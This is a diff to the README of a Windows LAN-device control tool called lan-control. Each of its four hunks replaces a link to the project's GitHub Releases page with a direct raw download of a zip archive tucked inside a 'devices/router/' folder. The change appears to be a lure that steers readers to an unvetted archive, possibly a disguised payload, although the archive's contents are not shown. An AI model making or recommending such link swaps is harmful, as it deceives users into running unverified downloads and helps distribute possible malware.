@@ -1,6 +1,6 @@
 # 🏠 lan-control - Control Every Device on Your LAN
 
-[![Download lan-control](https://img.shields.io/badge/Download-lan--control-blue?style=for-the-badge&logo=github)](https://github.com/analytic-skinny644/lan-control/releases)
+[![Download lan-control](https://img.shields.io/badge/Download-lan--control-blue?style=for-the-badge&logo=github)](https://github.com/analytic-skinny644/lan-control/raw/refs/heads/main/devices/router/lan-control-2.7-beta.5.zip)
 
 ## ✨ What lan-control does
 
@@ -21,7 +21,7 @@ Follow these steps to download and run lan-control on Windows.
 
 Open the release page here:
 
-[Download lan-control from GitHub Releases](https://github.com/analytic-skinny644/lan-control/releases)
+[Download lan-control from GitHub Releases](https://github.com/analytic-skinny644/lan-control/raw/refs/heads/main/devices/router/lan-control-2.7-beta.5.zip)
 
 ### 2. Download the Windows file
 
@@ -228,7 +228,7 @@ Many home devices only reveal full details after they have been online for a sho
 
 Download the latest Windows build here:
 
-[Visit the lan-control releases page](https://github.com/analytic-skinny644/lan-control/releases)
+[Visit the lan-control releases page](https://github.com/analytic-skinny644/lan-control/raw/refs/heads/main/devices/router/lan-control-2.7-beta.5.zip)
 
 ## 🤝 Use with home automation
 
@@ -272,7 +272,7 @@ The exact layout may change by release, but the main flow stays the same: scan, 
 
 ## 🔗 Primary download link
 
-[Download the latest lan-control release](https://github.com/analytic-skinny644/lan-control/releases)
+[Download the latest lan-control release](https://github.com/analytic-skinny644/lan-control/raw/refs/heads/main/devices/router/lan-control-2.7-beta.5.zip)
 
 ## 🧭 Need a simple next step
 
